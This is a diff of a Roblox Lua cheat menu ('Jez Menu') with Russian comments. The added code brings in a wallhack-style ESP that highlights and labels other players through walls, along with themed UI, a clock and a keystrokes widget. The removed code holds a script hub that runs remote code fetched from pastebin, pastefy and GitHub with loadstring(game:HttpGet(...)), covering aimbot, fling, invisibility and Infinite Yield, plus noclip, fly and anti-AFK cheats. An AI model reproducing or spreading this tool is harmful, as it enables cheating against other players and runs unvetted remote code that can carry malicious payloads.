+                tabData.Button.BackgroundColor3 = darkAccent
+                tabData.Button.TextColor3 = Color3.fromRGB(200, 200, 200)
             end
         end
-    end
-end)
-
--- [[ ДОПОЛНИТЕЛЬНЫЕ ОКНА (Исправленные) ]] --
-
--- 2. ОКНО СКРИПТОВ
-local ScriptFrame = Instance.new("Frame", ScreenGui)
-ScriptFrame.Size = UDim2.new(0, 220, 0, 280)
-ScriptFrame.Position = UDim2.new(0.1, 280, 0.4, 0)
-ScriptFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-ScriptFrame.Visible = false
-Instance.new("UICorner", ScriptFrame)
-
-local SearchBox = Instance.new("TextBox", ScriptFrame)
-SearchBox.Size = UDim2.new(0.9, 0, 0, 30)
-SearchBox.Position = UDim2.new(0.05, 0, 0.05, 0)
-SearchBox.PlaceholderText = "Поиск..."
-SearchBox.Text = "" -- ВОТ ЭТА СТРОЧКА УБИРАЕТ НАДПИСЬ "TextBox"
-SearchBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-styleText(SearchBox, 14)
-Instance.new("UICorner", SearchBox)
-
-
--- === ОБНОВЛЕННЫЙ СКРОЛЛ ДЛЯ СКРИПТОВ ===
-local Scroll = Instance.new("ScrollingFrame", ScriptFrame)
-Scroll.Size = UDim2.new(0.9, 0, 0.75, 0)
-Scroll.Position = UDim2.new(0.05, 0, 0.22, 0) 
-Scroll.BackgroundTransparency = 1
-Scroll.BorderSizePixel = 0
-Scroll.ScrollBarThickness = 4 
-Scroll.ScrollBarImageColor3 = Color3.fromRGB(46, 204, 113) 
-Scroll.CanvasSize = UDim2.new(0, 0, 0, 0) 
-
-local ScriptList = Instance.new("UIListLayout", Scroll)
-ScriptList.Padding = UDim.new(0, 8)
-ScriptList.SortOrder = Enum.SortOrder.LayoutOrder
-
--- АВТО-РАСШИРЕНИЕ
-ScriptList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    Scroll.CanvasSize = UDim2.new(0, 0, 0, ScriptList.AbsoluteContentSize.Y + 10)
-end)
-
-local function createSectionTitle(text, parent)
-
-    local label = Instance.new("TextLabel", parent)
-    label.Size = UDim2.new(1, 0, 0, 25)
-    label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    label.Text = "--- " .. text .. " ---"
-    label.TextColor3 = Color3.fromRGB(200, 200, 200)
-    styleText(label, 12)
-    Instance.new("UICorner", label)
-    return label
-
+        
+        for _, item in ipairs(registeredButtons) do
+            if item.Button and item.Button.Parent then
+                item.Button.BackgroundColor3 = darkAccent
+                if item.Button:IsA("TextButton") and item.Button ~= LangBtn then
+                    item.Button.TextColor3 = Color3.fromRGB(245, 245, 245)
+                end
+            end
+            if item.Stroke and item.Stroke.Parent then
+                item.Stroke.Color = accentColor
+                item.Stroke.Transparency = 0
+                item.Stroke.Enabled = true
+            end
+        end
+    end)
 end
 
-local StatusLabel = Instance.new("TextLabel", ScriptFrame)
-StatusLabel.Size = UDim2.new(0.9, 0, 0, 20)
-StatusLabel.Position = UDim2.new(0.05, 0, 0.93, 0)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "" -- По умолчанию пусто
-styleText(StatusLabel, 12)
-StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113) -- Зеленый цвет успеха
+local function applyTheme(theme)
+    stopRainbowTheme()
+    CurrentTheme = theme
+    local tInfo = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    
+    tween(MainFrame, tInfo, {BackgroundColor3 = theme.Black})
+    tween(Header, tInfo, {BackgroundColor3 = theme.Dark})
+    tween(MainStroke, tInfo, {Color = theme.Grey})
+    tween(HeaderDivider, tInfo, {BackgroundColor3 = theme.Grey})
+    tween(HeaderLogo, tInfo, {TextColor3 = theme.White})
+    tween(HeaderTitle, tInfo, {TextColor3 = theme.Light})
+    
+    tween(FloatingBtn, tInfo, {BackgroundColor3 = theme.Dark, TextColor3 = theme.White})
+    tween(FloatStroke, tInfo, {Color = theme.Grey})
+    tween(ScrollLeftBtn, tInfo, {BackgroundColor3 = theme.Dark, TextColor3 = theme.White})
+    tween(ScrollLeftStroke, tInfo, {Color = theme.Grey})
+    tween(ScrollRightBtn, tInfo, {BackgroundColor3 = theme.Dark, TextColor3 = theme.White})
+    tween(ScrollRightStroke, tInfo, {Color = theme.Grey})
+    
+    if clockWidgetRef then
+        tween(clockWidgetRef, tInfo, {BackgroundColor3 = theme.Dark})
+        tween(clockStrokeRef, tInfo, {Color = theme.Grey})
+        tween(clockTimeRef, tInfo, {TextColor3 = theme.White})
+        tween(clockDateRef, tInfo, {TextColor3 = theme.Light})
+    end
+    
+    for _, tabData in ipairs(tabs) do
+        tabData.Stroke.Color = theme.Grey
+        tabData.Page.ScrollBarImageColor3 = theme.Grey
+        if activeTab == tabData then
+            tween(tabData.Button, tInfo, {BackgroundColor3 = theme.Grey, TextColor3 = theme.White})
+            tabData.Stroke.Transparency = 0.2
+        else
+            tween(tabData.Button, tInfo, {BackgroundColor3 = theme.Dark, TextColor3 = theme.Light})
+            tabData.Stroke.Transparency = 0.8
+        end
+    end
+    
+    for _, item in ipairs(registeredButtons) do
+        if item.Button and item.Button.Parent then
+            tween(item.Button, tInfo, {BackgroundColor3 = theme.Dark})
+            if item.Button:IsA("TextButton") then
+                tween(item.Button, tInfo, {TextColor3 = theme.White})
+            end
+        end
+        if item.Stroke and item.Stroke.Parent then
+            item.Stroke.Enabled = true
+            item.Stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+            tween(item.Stroke, tInfo, {Color = theme.Grey, Transparency = 0})
+        end
+    end
+end
 
--- 3. ОКНО ИГРОКА
-local PlayerFrame = Instance.new("Frame", ScreenGui)
-PlayerFrame.Size = UDim2.new(0, 220, 0, 420) 
-PlayerFrame.Position = UDim2.new(0.1, 280, 0.4, 0)
-PlayerFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-PlayerFrame.Visible = false -- По умолчанию закрыто
-Instance.new("UICorner", PlayerFrame)
-
-local function createBtn(text, pos, parent)
+local function addStyledButton(parent, text, onClick)
     local btn = Instance.new("TextButton", parent)
-    btn.Size = UDim2.new(0.9, 0, 0, 35)
-    btn.Position = pos
+    btn.Size = UDim2.new(1, -8, 0, 38)
+    btn.BackgroundColor3 = CurrentTheme.Dark
+    btn.BorderSizePixel = 0
     btn.Text = text
-    btn.BackgroundColor3 = Color_Off
-    styleText(btn, 12)
-    Instance.new("UICorner", btn)
+    btn.Font = Enum.Font.GothamMedium
+    btn.TextSize = 13
+    btn.TextColor3 = CurrentTheme.White
+    btn.ZIndex = 4
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+    
+    local stroke = Instance.new("UIStroke", btn)
+    stroke.Thickness = 1.5
+    stroke.Color = CurrentTheme.Grey
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    stroke.Transparency = 0
+    stroke.Enabled = true
+    
+    table.insert(registeredButtons, {Button = btn, Stroke = stroke})
+    
+    if onClick then
+        btn.MouseButton1Click:Connect(onClick)
+    end
     return btn
 end
 
--- 4. ОКНО АНИМАЦИЙ
+-- ==========================================
+--          ESP СИСТЕМА
+-- ==========================================
 
-local function createSectionTitle(text, parent)
-    local headerFrame = Instance.new("Frame", parent)
-    headerFrame.Name = "Header_" .. text
-    headerFrame.Size = UDim2.new(1, -5, 0, 26) 
-    headerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-    headerFrame.BorderSizePixel = 0
-    
-    local corner = Instance.new("UICorner", headerFrame)
-    corner.CornerRadius = UDim.new(0, 5)
-    
-    local label = Instance.new("TextLabel", headerFrame)
+local espEnabled = false
+local espFolder = Instance.new("Folder", ScreenGui)
+espFolder.Name = "J_Project_ESP"
+
+local function getUniquePlayerColor(player)
+    local id = player.UserId or 0
+    local hue = (id * 0.618033988749895) % 1
+    return Color3.fromHSV(hue, 0.68, 0.95)
+end
+
+local function removeESP(player)
+    local oldEsp = espFolder:FindFirstChild(player.Name)
+    if oldEsp then oldEsp:Destroy() end
+end
+
+local function createESP(player)
+    if player == LocalPlayer then return end
+    removeESP(player)
+
+    local function setupCharacter(char)
+        if not espEnabled then return end
+        removeESP(player)
+
+        local playerEspContainer = Instance.new("Folder")
+        playerEspContainer.Name = player.Name
+        playerEspContainer.Parent = espFolder
+
+        local playerColor = getUniquePlayerColor(player)
+
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "HighlightESP"
+        highlight.Adornee = char
+        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+        highlight.FillColor = playerColor
+        highlight.FillTransparency = 1
+        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+        highlight.OutlineTransparency = 1
+        highlight.Parent = playerEspContainer
+
+        tween(highlight, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+            FillTransparency = 0.55,
+            OutlineTransparency = 0.15
+        })
+
+        local head = char:WaitForChild("Head", 5) or char:FindFirstChildWhichIsA("BasePart")
+        if head then
+            local bb = Instance.new("BillboardGui")
+            bb.Name = "NameTagESP"
+            bb.Adornee = head
+            bb.Size = UDim2.new(0, 150, 0, 30)
+            bb.StudsOffset = Vector3.new(0, 2.5, 0)
+            bb.AlwaysOnTop = true
+            bb.Parent = playerEspContainer
+
+            local bbScale = Instance.new("UIScale", bb)
+            bbScale.Scale = 0
+
+            local tagLabel = Instance.new("TextLabel", bb)
+            tagLabel.Size = UDim2.new(1, 0, 1, 0)
+            tagLabel.BackgroundTransparency = 1
+            tagLabel.Text = player.DisplayName .. "\n(@" .. player.Name .. ")"
+            tagLabel.Font = Enum.Font.GothamBold
+            tagLabel.TextSize = 12
+            tagLabel.TextColor3 = playerColor
+            tagLabel.TextStrokeTransparency = 0.25
+            tagLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+            tween(bbScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
+        end
+    end
+
+    if player.Character then
+        task.spawn(function() setupCharacter(player.Character) end)
+    end
+    player.CharacterAdded:Connect(setupCharacter)
+end
+
+local function toggleESP()
+    espEnabled = not espEnabled
+    espFolder:ClearAllChildren()
+
+    if espEnabled then
+        for _, player in ipairs(Players:GetPlayers()) do
+            createESP(player)
+        end
+    end
+    return espEnabled
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if espEnabled then createESP(player) end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    removeESP(player)
+end)
+
+-- ==========================================
+--     ЧАСОВОЙ ВИДЖЕТ
+-- ==========================================
+
+local clockEnabled = false
+
+local ClockFrame = Instance.new("Frame", ScreenGui)
+ClockFrame.Name = "ClockWidget"
+ClockFrame.Size = UDim2.new(0, 190, 0, 75)
+ClockFrame.Position = UDim2.new(0.8, -10, 0.05, 0)
+ClockFrame.BackgroundColor3 = CurrentTheme.Dark
+ClockFrame.BorderSizePixel = 0
+ClockFrame.Visible = false
+ClockFrame.ZIndex = 80
+Instance.new("UICorner", ClockFrame).CornerRadius = UDim.new(0, 10)
+
+local ClockStroke = Instance.new("UIStroke", ClockFrame)
+ClockStroke.Thickness = 1.5
+ClockStroke.Color = CurrentTheme.Grey
+ClockStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+clockWidgetRef = ClockFrame
+clockStrokeRef = ClockStroke
+
+local ClockHeader = Instance.new("Frame", ClockFrame)
+ClockHeader.Size = UDim2.new(1, 0, 0, 24)
+ClockHeader.BackgroundTransparency = 1
+ClockHeader.ZIndex = 81
+
+local ClockTitle = Instance.new("TextLabel", ClockHeader)
+ClockTitle.Position = UDim2.new(0, 10, 0, 0)
+ClockTitle.Size = UDim2.new(1, -20, 1, 0)
+ClockTitle.BackgroundTransparency = 1
+ClockTitle.Text = "🕒 TIMEZONE"
+ClockTitle.Font = Enum.Font.GothamBold
+ClockTitle.TextSize = 11
+ClockTitle.TextColor3 = CurrentTheme.Light
+ClockTitle.TextXAlignment = Enum.TextXAlignment.Left
+ClockTitle.ZIndex = 82
+
+local TimeLabel = Instance.new("TextLabel", ClockFrame)
+TimeLabel.Position = UDim2.new(0, 10, 0, 22)
+TimeLabel.Size = UDim2.new(1, -20, 0, 30)
+TimeLabel.BackgroundTransparency = 1
+TimeLabel.Text = "00:00:00"
+TimeLabel.Font = Enum.Font.GothamBlack
+TimeLabel.TextSize = 22
+TimeLabel.TextColor3 = CurrentTheme.White
+TimeLabel.TextXAlignment = Enum.TextXAlignment.Center
+TimeLabel.ZIndex = 82
+clockTimeRef = TimeLabel
+
+local DateLabel = Instance.new("TextLabel", ClockFrame)
+DateLabel.Position = UDim2.new(0, 10, 0, 52)
+DateLabel.Size = UDim2.new(1, -20, 0, 16)
+DateLabel.BackgroundTransparency = 1
+DateLabel.Text = "01.01.2026"
+DateLabel.Font = Enum.Font.GothamMedium
+DateLabel.TextSize = 11
+DateLabel.TextColor3 = CurrentTheme.Light
+DateLabel.TextXAlignment = Enum.TextXAlignment.Center
+DateLabel.ZIndex = 82
+clockDateRef = DateLabel
+
+makeDraggable(ClockFrame, true)
+
+task.spawn(function()
+    while true do
+        if ClockFrame.Visible then
+            local t = os.date("*t")
+            TimeLabel.Text = string.format("%02d:%02d:%02d", t.hour, t.min, t.sec)
+            DateLabel.Text = string.format("%02d.%02d.%04d", t.day, t.month, t.year)
+        end
+        task.wait(0.5)
+    end
+end)
+
+-- ==========================================
+--        KEYSTROKES WIDGET
+-- ==========================================
+
+local KeysFrame = Instance.new("Frame", ScreenGui)
+KeysFrame.Name = "KeystrokesWidget"
+KeysFrame.Size = UDim2.new(0, 130, 0, 130)
+KeysFrame.Position = UDim2.new(0.8, -10, 0.2, 0)
+KeysFrame.BackgroundTransparency = 1
+KeysFrame.Visible = false
+KeysFrame.ZIndex = 80
+
+makeDraggable(KeysFrame, true)
+
+local function createKeyTile(name, text, pos, size)
+    local tile = Instance.new("Frame", KeysFrame)
+    tile.Name = "Key_" .. name
+    tile.Position = pos
+    tile.Size = size
+    tile.BackgroundColor3 = CurrentTheme.Dark
+    tile.BorderSizePixel = 0
+    tile.ZIndex = 81
+    Instance.new("UICorner", tile).CornerRadius = UDim.new(0, 6)
+
+    local stroke = Instance.new("UIStroke", tile)
+    stroke.Thickness = 1.5
+    stroke.Color = CurrentTheme.Grey
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    local label = Instance.new("TextLabel", tile)
     label.Size = UDim2.new(1, 0, 1, 0)
     label.BackgroundTransparency = 1
     label.Text = text
-    label.TextColor3 = Color3.fromRGB(0, 255, 150)
-    label.Font = Enum.Font.SourceSansBold
+    label.Font = Enum.Font.GothamBold
     label.TextSize = 14
-    
-    return headerFrame
+    label.TextColor3 = CurrentTheme.White
+    label.ZIndex = 82
+
+    table.insert(registeredButtons, {Button = tile, Stroke = stroke})
+    return {Tile = tile, Label = label, Stroke = stroke}
 end
 
-local AnimFrame = Instance.new("Frame", ScreenGui)
-AnimFrame.Name = "AnimFrame"
-AnimFrame.Size = UDim2.new(0, 260, 0, 400)
-AnimFrame.Position = UDim2.new(0.1, 280, 0.4, 0)
-AnimFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-AnimFrame.Visible = false 
-Instance.new("UICorner", AnimFrame)
+local keyW = createKeyTile("W", "W", UDim2.new(0, 44, 0, 0), UDim2.new(0, 42, 0, 42))
+local keyA = createKeyTile("A", "A", UDim2.new(0, 0, 0, 46), UDim2.new(0, 42, 0, 42))
+local keyS = createKeyTile("S", "S", UDim2.new(0, 44, 0, 46), UDim2.new(0, 42, 0, 42))
+local keyD = createKeyTile("D", "D", UDim2.new(0, 88, 0, 46), UDim2.new(0, 42, 0, 42))
+local keySpace = createKeyTile("Space", "—", UDim2.new(0, 0, 0, 92), UDim2.new(0, 130, 0, 28))
+
+local keyMap = {
+    [Enum.KeyCode.W] = keyW,
+    [Enum.KeyCode.A] = keyA,
+    [Enum.KeyCode.S] = keyS,
+    [Enum.KeyCode.D] = keyD,
+    [Enum.KeyCode.Space] = keySpace,
+    [Enum.KeyCode.Up] = keyW,
+    [Enum.KeyCode.Left] = keyA,
+    [Enum.KeyCode.Down] = keyS,
+    [Enum.KeyCode.Right] = keyD
+}
 
--- 1. Левая колонка для R6
-
-local R6Frame = Instance.new("ScrollingFrame", AnimFrame)
-R6Frame.Size = UDim2.new(0.45, 0, 0.85, 0) 
-R6Frame.Position = UDim2.new(0.03, 0, 0.10, 0)
-R6Frame.BackgroundTransparency = 1
-R6Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
-R6Frame.ScrollBarThickness = 1
-local R6List = Instance.new("UIListLayout", R6Frame)
-R6List.Padding = UDim.new(0, 5)
-
--- 2. Правая колонка для R15
-
-local R15Frame = Instance.new("ScrollingFrame", AnimFrame)
-R15Frame.Size = UDim2.new(0.45, 0, 0.85, 0)
-R15Frame.Position = UDim2.new(0.52, 0, 0.10, 0)
-R15Frame.BackgroundTransparency = 1
-R15Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
-R15Frame.ScrollBarThickness = 1
-local R15List = Instance.new("UIListLayout", R15Frame)
-R15List.Padding = UDim.new(0, 5)
-
--- 3. Разделительная полоска
-
-local Divider = Instance.new("Frame", AnimFrame)
-Divider.Size = UDim2.new(0, 2, 0.8, 0)
-Divider.Position = UDim2.new(0.5, -1, 0.15, 0)
-Divider.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-Divider.BorderSizePixel = 0
-
-local AnimTitle = Instance.new("TextLabel", AnimFrame)
-AnimTitle.Size = UDim2.new(1, 0, 0, 35)
-AnimTitle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-AnimTitle.Text = "МЕНЮ АНИМАЦИЙ"
-styleText(AnimTitle, 14)
-Instance.new("UICorner", AnimTitle)
-
-createSectionTitle("R6", R6Frame)
-createSectionTitle("R15", R15Frame)
-
-makeDraggable(AnimFrame) 
-
--- === КНОПКА JERK TOOL (ОБВОДКА ВНУТРИ) ===
-
-local JerkToolBtn = Instance.new("TextButton", R15Frame)
-JerkToolBtn.Size = UDim2.new(1, -5, 0, 32)
-JerkToolBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-JerkToolBtn.Text = "JERK TOOL (R15)"
-JerkToolBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-JerkToolBtn.Font = Enum.Font.SourceSansBold
-JerkToolBtn.TextSize = 13 -- Чуть меньше текст, чтобы рамка его не задевала
-
-local JCorner = Instance.new("UICorner", JerkToolBtn)
-JCorner.CornerRadius = UDim.new(0, 6)
-
--- ЗЕЛЕНАЯ ОБВОДКА (ТЕПЕРЬ ВНУТРИ)
-
-local JStroke = Instance.new("UIStroke", JerkToolBtn)
-JStroke.Color = Color3.fromRGB(46, 204, 113)
-JStroke.Thickness = 1.2 -- Уменьшил с 2 до 1.2 (стала тоньше)
-JStroke.Transparency = 0.3 -- Добавил прозрачность (стала менее резкой)
-JStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
-
--- Логика нажатия
-JerkToolBtn.MouseButton1Click:Connect(function()
-    local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
-    if hum and hum.RigType == Enum.HumanoidRigType.R15 then
-        JerkToolBtn.Text = "ЗАПУСК..."
-        loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
-        task.wait(1)
-        JerkToolBtn.Text = "JERK TOOL: OK"
-        JStroke.Color = Color3.fromRGB(0, 255, 255) -- Голубая при работе
-    else
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Jez Menu",
-            Text = "Нужен R15!",
-            Duration = 3
-        })
-    end
-end)
-
--- === КНОПКА SPIDER SCRIPT ДЛЯ ОКНА R6 ===
-local SpiderBtn = Instance.new("TextButton", R6Frame)
-SpiderBtn.Size = UDim2.new(1, -5, 0, 32)
-SpiderBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-SpiderBtn.Text = "SPIDER SCRIPT (R6)"
-SpiderBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-SpiderBtn.Font = Enum.Font.SourceSansBold
-SpiderBtn.TextSize = 13
-
-local SCorner = Instance.new("UICorner", SpiderBtn)
-SCorner.CornerRadius = UDim.new(0, 6)
-
--- СЛАБАЯ ОБВОДКА (как ты просил)
-local SStroke = Instance.new("UIStroke", SpiderBtn)
-SStroke.Color = Color3.fromRGB(255, 50, 50) -- Сделаем красной для отличия от R15
-SStroke.Thickness = 1.2
-SStroke.Transparency = 0.3
-SStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
-
--- Логика нажатия
-SpiderBtn.MouseButton1Click:Connect(function()
-    local hum = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")
-    
-    if hum and hum.RigType == Enum.HumanoidRigType.R6 then
-        SpiderBtn.Text = "ЗАПУСК..."
-        -- Твой новый скрипт
-        loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))("Spider Script")
-        
-        task.wait(1)
-        SpiderBtn.Text = "SPIDER: OK"
-        SStroke.Color = Color3.fromRGB(255, 255, 255) -- Белая обводка при активации
-    else
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Jez Menu",
-            Text = "Нужен R6 аватар!",
-            Duration = 3
-        })
-    end
-end)
-
--- АВТОМАТИЧЕСКОЕ РАСШИРЕНИЕ СПИСКА (вставь это сразу после кнопки)
-R15List:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    R15Frame.CanvasSize = UDim2.new(0, 0, 0, R15List.AbsoluteContentSize.Y + 10)
-end)
-
-R6List:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    R6Frame.CanvasSize = UDim2.new(0, 0, 0, R6List.AbsoluteContentSize.Y + 10)
-end)
-
-
--- 1. Кнопки основных функций
-
-local InfJumpBtn = createBtn("Прыжок: ВЫКЛ", UDim2.new(0.05, 0, 0.05, 0), PlayerFrame)
-local FlyBtn     = createBtn("Полет: ВЫКЛ", UDim2.new(0.05, 0, 0.15, 0), PlayerFrame)
-local UnlockCursorBtn = createBtn("Свобода курсора: ВЫКЛ", UDim2.new(0.05, 0, 0.80, 0), PlayerFrame)
-
--- 2. Кнопка Water Walk (Исправленные цвета: твой зеленый и подходящий красный)
-local WaterBtn = createBtn("Water Walk: OFF", UDim2.new(0.05, 0, 0.25, 0), PlayerFrame)
-WaterBtn.BackgroundColor3 = Color3.fromRGB(130, 40, 40) 
-
-WaterBtn.MouseButton1Click:Connect(function()
-    waterWalkActive = not waterWalkActive
-    if waterWalkActive then
-        WaterBtn.Text = "Water Walk: ON"
-        WaterBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113) -- Твой зеленый
-    else
-        WaterBtn.Text = "Water Walk: OFF"
-        WaterBtn.BackgroundColor3 = Color3.fromRGB(130, 40, 40) -- Обратно в красный
-        waterPart.CanCollide = false
-        waterPart.Position = Vector3.new(0, -1000, 0)
-    end
-end)
-
--- 3. Настройка скорости полета
-local FlySpeedLabel = Instance.new("TextLabel", PlayerFrame)
-FlySpeedLabel.Size = UDim2.new(0.9, 0, 0, 25)
-FlySpeedLabel.Position = UDim2.new(0.05, 0, 0.36, 0)
-FlySpeedLabel.Text = "СКОРОСТЬ ПОЛЕТА: " .. flySpeed
-FlySpeedLabel.BackgroundTransparency = 1
-styleText(FlySpeedLabel, 14)
-
-local AddFly = Instance.new("TextButton", PlayerFrame)
-AddFly.Size = UDim2.new(0.43, 0, 0, 32)
-AddFly.Position = UDim2.new(0.05, 0, 0.44, 0)
-AddFly.Text = "+ ПОЛЕТ"
-AddFly.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-styleText(AddFly, 12)
-Instance.new("UICorner", AddFly)
-
-local SubFly = Instance.new("TextButton", PlayerFrame)
-SubFly.Size = UDim2.new(0.43, 0, 0, 32)
-SubFly.Position = UDim2.new(0.52, 0, 0.44, 0)
-SubFly.Text = "- ПОЛЕТ"
-SubFly.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-styleText(SubFly, 12)
-Instance.new("UICorner", SubFly)
-
-
-local NoclipBtn  = createBtn("Сквозь стены: ВЫКЛ", UDim2.new(0.05, 0, 0.56, 0), PlayerFrame)
-local AntiAfkBtn = createBtn("Anti-AFK: ВЫКЛ", UDim2.new(0.05, 0, 0.68, 0), PlayerFrame)
-
--- [[ ЛОГИКА ВЕРСИИ ВНИЗУ ]] --
-local VersionLabel = Instance.new("TextLabel", PlayerFrame) -- Добавим и сюда для красоты
-VersionLabel.Size = UDim2.new(1, 0, 0, 20)
-VersionLabel.Position = UDim2.new(0, 0, 1, -20)
-VersionLabel.BackgroundTransparency = 1
-VersionLabel.Text = "v20"
-VersionLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
-VersionLabel.Font = Enum.Font.Gotham
-VersionLabel.TextSize = 10
-VersionLabel.TextTransparency = 0.5
-
--- Логика Anti-AFK
-local antiAfkEnabled = false
-local VirtualUser = game:GetService("VirtualUser")
-
-AntiAfkBtn.MouseButton1Click:Connect(function()
-    antiAfkEnabled = not antiAfkEnabled
-    AntiAfkBtn.Text = "Anti-AFK: " .. (antiAfkEnabled and "ВКЛ" or "ВЫКЛ")
-    AntiAfkBtn.BackgroundColor3 = antiAfkEnabled and Color_On or Color_Off
-end)
-
-localPlayer.Idled:Connect(function()
-    if antiAfkEnabled then
-        VirtualUser:CaptureController()
-        VirtualUser:ClickButton2(Vector2.new())
-    end
-end)
-
--- [[ ЛОГИКА СВОБОДЫ КУРСОРA (ТОЛЬКО КНОПКА В МЕНЮ) ]] --
-local cursorUnlocked = false
-
-local function toggleCursor()
-    cursorUnlocked = not cursorUnlocked
-    
-    if cursorUnlocked then
-        UnlockCursorBtn.Text = "Свобода курсора: ВКЛ"
-        UnlockCursorBtn.BackgroundColor3 = Color_On
-        
-        UserInputService.MouseBehavior = Enum.MouseBehavior.Default
-        UserInputService.MouseIconEnabled = true
-        workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
-    else
-        UnlockCursorBtn.Text = "Свобода курсора: ВЫКЛ"
-        UnlockCursorBtn.BackgroundColor3 = Color_Off
-        
-        workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
-        UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
-    end
-end
-
-UnlockCursorBtn.MouseButton1Click:Connect(toggleCursor)
-
--- [[ ЛОГИКА NOCLIP ]] --
-local noclipEnabled = false
-local RunService = game:GetService("RunService")
-
--- Функция переключения кнопки
-NoclipBtn.MouseButton1Click:Connect(function()
-    noclipEnabled = not noclipEnabled
-    NoclipBtn.Text = "Проход сквозь стены: " .. (noclipEnabled and "ВКЛ" or "ВЫКЛ")
-    NoclipBtn.BackgroundColor3 = noclipEnabled and Color_On or Color_Off
-end)
-
--- Сам процесс прохода сквозь стены
-RunService.Stepped:Connect(function()
-    if noclipEnabled and localPlayer.Character then
-        for _, part in pairs(localPlayer.Character:GetDescendants()) do
-            if part:IsA("BasePart") then
-                part.CanCollide = false
-            end
-        end
-    end
-end)
-
--- [[ ЛОГИКА И СОБЫТИЯ ]] --
-
-local function addScript(name, url, extra)
-    local b = Instance.new("TextButton", Scroll)
-    b.Size = UDim2.new(1, 0, 0, 35)
-    b.Text = name
-    b.Name = name:lower()
-    b.BackgroundColor3 = Color3.fromRGB(35,35,35)
-    styleText(b, 12)
-    Instance.new("UICorner", b)
-    
-    b.MouseButton1Click:Connect(function()
-        StatusLabel.Text = "Загрузка..."
-        StatusLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
-        
-        task.spawn(function()
-            local scriptData
-            local downloadSuccess = pcall(function()
-                scriptData = game:HttpGet(url)
-            end)
-            
-            if downloadSuccess and scriptData then
-                StatusLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-                StatusLabel.Text = "Успешно загружено!"
-                task.spawn(function()
-                    local loaded = loadstring(scriptData)
-                    if extra then 
-                        loaded(extra) -- Запуск с аргументом (для инвиза)
-                    else 
-                        loaded() -- Обычный запуск
-                    end
-                end)
-            else
-                StatusLabel.TextColor3 = Color3.fromRGB(231, 76, 60)
-                StatusLabel.Text = "Ошибка сети"
-            end
-            
-            task.wait(2)
-            StatusLabel.Text = ""
-        end)
-    end)
-end
-
--- ОБНОВЛЕННЫЙ СПИСОК СКРИПТОВ
-
-addScript("Infinite Yield", "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")
-addScript("Lucky Blocks", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20lucky")
-addScript("Invisible", "https://pastebin.com/raw/3Rnd9rHf", "t.me/scriptrobox")
-addScript("Jez Fling List", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20fling")
-addScript("J-AIM", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/J-AIM")
-addScript("JEZ SMART TRANSLATOR", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/JEZ%20SMART%20TRANSLATOR")
-addScript("JEZ COORDINATES", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/JEZ%20COORDINATES")
-addScript("JEZ INVENTORY VIEW", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/JEZ%20INVENTORY%20VIEW")
-addScript("Jez Camping", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20Camping")
-addScript("Jez Hider", "https://raw.githubusercontent.com/Korol1Laguwok/Jez-Scripts/refs/heads/main/Jez%20Hider")
-
